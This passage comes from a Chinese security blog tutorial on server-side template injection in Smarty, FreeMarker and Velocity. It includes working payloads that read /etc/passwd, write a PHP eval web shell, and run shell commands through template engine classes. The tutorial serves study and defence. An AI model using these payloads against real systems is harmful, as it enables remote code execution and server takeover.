+<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>Smarty为不受信任的模板执行提供了安全模式。设置了白名单，那在模板中就无法调用任意函数。但通过阅读smarty的官方手册发现，$smarty内置变量可用于访问环境变量，</p>
+<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getStreamVariable</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token variable">$_result</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+        <span class="token variable">$fp</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$variable</span><span class="token punctuation">,</span> <span class="token string">'r+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$current_line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token variable">$_result</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$current_line</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token variable">$_result</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">smarty</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error_unassigned</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">'Undefined stream variable "'</span> <span class="token punctuation">.</span> <span class="token variable">$variable</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+payload<span class="token punctuation">:</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;self::getStreamVariable("file:</span><span class="token comment" spellcheck="true">///etc/passwd")&amp;#125;</span>
+</code></pre>
+<p>但并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
+<p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Smarty_Internal_Write_File</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token comment" spellcheck="true">/**
+     * Writes file in a safe way to disk
+     *
+     * @param  string $_filepath complete filepath
+     * @param  string $_contents file content
+     * @param  Smarty $smarty    smarty instance
+     *
+     * @throws SmartyException
+     * @return boolean true
+     */</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">,</span> Smarty <span class="token variable">$smarty</span><span class="token punctuation">)</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token variable">$_error_reporting</span> <span class="token operator">=</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token constant">E_WARNING</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token variable">$old_umask</span> <span class="token operator">=</span> <span class="token function">umask</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+        <span class="token variable">$_dirpath</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment" spellcheck="true">// if subdirs, create dir structure</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_dirpath</span> <span class="token operator">!==</span> <span class="token string">'.'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$_dirpath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dir_perms</span> <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0777</span> <span class="token punctuation">:</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dir_perms</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+        <span class="token comment" spellcheck="true">// write to tmp file, then move to overt file lock race condition</span>
+        <span class="token variable">$_tmp_file</span> <span class="token operator">=</span> <span class="token variable">$_dirpath</span> <span class="token punctuation">.</span> <span class="token constant">DS</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token string">'wrt'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">"unable to write file &amp;#123;$_tmp_file&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+        <span class="token comment" spellcheck="true">/*
+         * Windows' rename() fails if the destination exists,
+         * Linux' rename() properly handles the overwrite.
+         * Simply unlink()ing a file might cause other processes
+         * currently reading that file to fail, but linux' rename()
+         * seems to be smart enough to handle that for us.
+         */</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>Smarty<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$_IS_WINDOWS</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token comment" spellcheck="true">// remove original file</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+            <span class="token comment" spellcheck="true">// rename tmp file</span>
+            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>
+            <span class="token comment" spellcheck="true">// rename tmp file</span>
+            <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                <span class="token comment" spellcheck="true">// remove original file</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+                    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+                <span class="token comment" spellcheck="true">// rename tmp file</span>
+                <span class="token variable">$success</span> <span class="token operator">=</span> @<span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$_tmp_file</span><span class="token punctuation">,</span> <span class="token variable">$_filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$success</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">SmartyException</span><span class="token punctuation">(</span><span class="token string">"unable to write file &amp;#123;$_filepath&amp;#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+            <span class="token comment" spellcheck="true">// set file permissions</span>
+            <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$_filepath</span><span class="token punctuation">,</span> <span class="token variable">$smarty</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_file_perms</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">umask</span><span class="token punctuation">(</span><span class="token variable">$old_umask</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+        <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token variable">$_error_reporting</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>
+<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token variable">$varname</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+    <span class="token keyword">return</span> Smarty_Internal_Extension_Config<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$varname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+payload<span class="token punctuation">:</span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,</span><span class="token string">"&lt;?php eval($_GET['cmd']); ?>"</span><span class="token punctuation">,</span>self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">clearConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<h4 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h4><ul>
+<li><p>{$smarty.version}  #获取smarty的版本号</p>
+</li>
+<li><p>{php}phpinfo();{&#x2F;php}  #执行相应的php代码，python3中已废弃{php}</p>
+</li>
+<li><p>{if phpinfo()}{&#x2F;if}</p>
+</li>
+</ul>
+<h2 id="java-ssti"><a href="#java-ssti" class="headerlink" title="java ssti"></a>java ssti</h2><p>java常见的模板引擎有FreeMarker，velocity等</p>
+<h3 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h3><p>freemarker的基本语法也不再讲述</p>
+<p>可以看这里学习：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/JealousGirl/p/freemarker.html">Freemarker的基本语法及入门基础</a></p>
+<p><img src="https://bu.dusays.com/2021/10/21/b45c3da94c8f9.png"></p>
+<p>FreeMarker模板代码：</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#–这是注释–</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome $<span class="token entity" title="&#123;">&amp;#123;</span>user<span class="token entity" title="&#125;">&amp;#125;</span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Our latest product:
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>$&amp;#123;latestProduct.url&amp;#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>$<span class="token entity" title="&#123;">&amp;#123;</span>latestProduct.name<span class="token entity" title="&#125;">&amp;#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>!
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
+<p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象。?new() 是其高级内置函数。</p>
+<p>可以看freemarker的文档：<a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">https://freemarker.apache.org/docs/ref_builtins_expert.html</a></p>
+<p>用法如下：</p>
+<pre><code>&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;
+&lt;#assign word_wrapp =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;
+&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;
+&lt;#assign word_wrapp_narrow =&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;
+</code></pre>
+<p>那么我么可以调用freemarker中的内置执行命令的对象 Execute</p>
+<ol>
+<li><p>在 freemarker.templete.utility 里面有个 Execute 类，这个类会执行它的参数，因此我们可以new一个Execute对象，传输可执行命令来达到rce</p>
+<p>payload：</p>
+<pre><code>&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;whoami&quot;)&#125;
+</code></pre>
+</li>
+<li><p>在freemarker.templete.utility里有个 ObjectConstructor 类，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造</p>
+<p>payload：</p>
+<pre><code>&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;whoami&quot;).start()&#125;
+</code></pre>
+</li>
+<li><p>在freemarker.template.utility里面的 JythonRuntime，可以通过自定义标签的方式，执行Python命令。</p>
+<p>payload：</p>
+<pre><code>&lt;#assign value=&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;whoami&quot;)&lt;/@value&gt;
+</code></pre>
+</li>
+</ol>
+<p>FreeMarker 是最流行的 Java 模板语言之一，也是最常向用户展示的语言。这让人惊讶的是，官方网站解释了允许用户提供模板的危险：</p>
+<blockquote>
+<ol start="23">
+<li>我可以允许用户上传模板吗？有什么安全隐患？</li>
+</ol>
+<p>通常，您不应允许这样做，除非这些用户是系统管理员或其他受信任的人员。将模板视为源代码的一部分，就像 *.java 文件一样。如果您仍希望允许用户上传模板，请考虑以下事项：</p>
+<p><a target="_blank" rel="noopener" href="http://freemarker.org/docs/app_faq.html#faq_template_uploading_security">http://freemarker.org/docs/app_faq.html#faq_template_uploading_security</a></p>
+</blockquote>
+<p>在拒绝服务等一些较小的风险背后，我们发现：</p>
+<p>在 new 的内置（Configuration.setNewBuiltinClassResolver， Environment.setNewBuiltinClassResolver）：它用于 “com.example.SomeClass”?new() ，对于部分在Java中实现但在普通模板中不需要的FTL库来说很重要。虽然 new 不会实例化不是 TemplateModel-s 的类，但FreeMarker 包含一个可用于创建任意 Java 对象的 TemplateModel类。类路径中可能存在其他“危险”的TemplateModel-s。另外，即使一个类没有实现 TemplateModel，它的静态初始化也会运行。为了避免这些，您应该使用一个 TemplateClassResolver来限制可访问的类（可能基于模板要求的类），例如 TemplateClassResolver.ALLOWS_NOTHING_RESOLVER。</p>
+<p>这个警告有点神秘，但它确实表明新的内置程序可能提供了一个有希望的利用途径。让我们看看有关new的文档：</p>
+<blockquote>
+<p>这个内置可能是一个安全问题，因为模板作者可以创建任意 Java 对象，然后使用它们，只要它们实现 TemplateModel。此外，模板作者可以为甚至没有实现 TemplateModel 的类触发静态初始化。[snip] 如果您允许不太受信任的用户上传模板，那么您绝对应该研究这个主题。</p>
+<p><a target="_blank" rel="noopener" href="http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new">http://freemarker.org/docs/ref_builtins_expert.html#ref_builtin_new</a></p>
+</blockquote>
+<p>我们可以去JavaDoc去看看有没有可用的类</p>
+<p><img src="https://bu.dusays.com/2021/10/23/f57a53256ba75.png"></p>
+<p>简单利用：</p>
+<pre><code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;whoami&quot;) &#125;
+</code></pre>
+<p>来源：<a target="_blank" rel="noopener" href="https://portswigger.net/research/server-side-template-injection">https://portswigger.net/research/server-side-template-injection</a></p>
+<h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/378827f1dfc8">Velocity</a>是另一种流行的 Java 模板语言，利用起来比较棘手。没有“安全注意事项”页面可以帮助指出最危险的函数，也没有明显的默认变量列表。以下屏幕截图显示了用于暴力破解变量名称的 Burp Intruder 工具，变量名称位于“有效负载”列的左侧，右侧是服务器的输出。</p>
+<p><img src="https://bu.dusays.com/2021/10/23/3b4b9532400dc.png"></p>
+<p>本类变量（高亮）看起来特别有前途，因为它返回一个通用对象。</p>
+<p>一种方法和一种属性脱颖而出：</p>
+<p>$class.inspect(类&#x2F;对象&#x2F;字符串)&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回检查指定类或对象的新 ClassTool 实例<br>$class.type&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;返回正在检查的实际类</p>
+<p>我们可以将$class.inspect与$class.type 链接起来以获取对任意对象的引用。然后我们可以使用<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec(java.lang.String)">Runtime.exec()</a>在目标系统上执行任意 shell 命令。</p>
+<pre><code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor()
+该模板旨在导致明显的时间延迟。
+</code></pre>
+<p>获取 shell 命令的输出有点棘手（毕竟这是 Java）：</p>
+<pre><code>#set($str=$class.inspect(&quot;java.lang.String&quot;).type)
+#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)
+#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8135">CVE-2019-3396 Confluence Velocity SSTI漏洞浅析</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Lees</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lees01.gitee.io/2021/10/11/ssti/">https://lees01.gitee.io/2021/10/11/ssti/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Lees</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/SSTI/">
+                                    <span class="chip bg-color">SSTI</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/10/15/python-pickle-fan-xu-lie-hua/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="pickle反序列化">
+                        
+                        <span class="card-title">pickle反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            基础知识pickle库及函数pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。
+常用的函数
+
+
+
+函数
+说明
+
+
+
+dumps
+对象反序列化为bytes对象
+
+
+dump
+对象反序列化到文件对象，存入文件
+
+
+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-15
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-category">
+                                    反序列化
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="chip bg-color">反序列化</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/10/10/xml-wai-bu-shi-ti-zhu-ru/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="XXE(xml外部实体注入)">
+                        
+                        <span class="card-title">XXE(xml外部实体注入)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            xml基础xml 指可扩展标记语言，设计宗旨是用来传输数据
+DTD（document type define文档类型定义）作用是定义XML文档的合法构建模块DTD可以在XML文档中声明，也可以外部引用
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-10
+                            </span>
+                        <span class="publish-author">
+                            
